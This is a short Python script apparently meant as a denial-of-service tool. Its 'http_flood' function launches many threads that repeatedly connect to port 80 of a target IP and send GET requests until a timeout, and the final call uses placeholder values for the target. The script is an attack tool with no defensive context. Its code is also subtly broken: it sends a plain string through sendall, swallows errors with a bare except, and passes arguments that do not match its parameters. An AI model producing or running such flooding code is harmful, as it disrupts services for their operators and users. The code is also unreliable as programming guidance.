import socket, threading, time

def http_flood(ip: str, timeout: str, thread: str):
    def flood(ip: str, port: int, timeout: int):
        start_time = int(time.time())

        while int(time.time()) - start_time < timeout:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.connect((ip, port))
                sock.sendall("GET / HTTP/1.1\r\n\r\n")
            except:
                pass

    for _ in range(int(thread)):
        threading.Thread(target= flood, args=(ip, 80, int(timeout))).start()

http_flood('!ip!', '!port!', '!time!')